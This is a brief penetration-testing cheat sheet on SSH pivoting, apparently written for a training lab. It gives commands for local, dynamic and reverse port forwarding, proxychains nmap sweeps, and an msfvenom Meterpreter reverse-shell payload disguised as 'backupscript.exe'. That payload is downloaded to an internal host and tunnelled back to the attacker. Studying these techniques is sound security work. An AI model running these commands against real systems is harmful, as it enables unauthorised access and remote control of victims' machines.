# SSH

## Overview

During internal network assessment, SSH is often used not only for remote access but also for tunnelling traffic between systems. If valid credentials or keys are obtained, SSH can provide a stable and encrypted channel into a target environment. It is also commonly used for local and remote port forwarding, allowing access to otherwise restricted internal services through a compromised host.
Local Port Forward

---
For when we need to access a specific port
```
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```
- Port 3306 is open on the target and we want to forward it to our port 1234
For multiple ports
```
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```
- curl http://localhost:8080
- mysql -h 127.0.0.1 -P 1234 -u root -p

Dynamic Port Forward
For when we do not have a specific port
```
ssh -D 9050 ubuntu@10.129.202.64
```
Proxychains will forward all traffic to port 9050
```
proxychains nmap -v -sn 172.16.5.1-200
```

Reverse Port Forward
Generate reverse shell
```
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```
Copy payload to machine then download payload to internal (2nd) machine
```
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```
```
ssh -R [Internal IP of Pivot]:8080:0.0.0.0:8000 ubuntu@[IP] -vN
```
Execute payload on internal machine
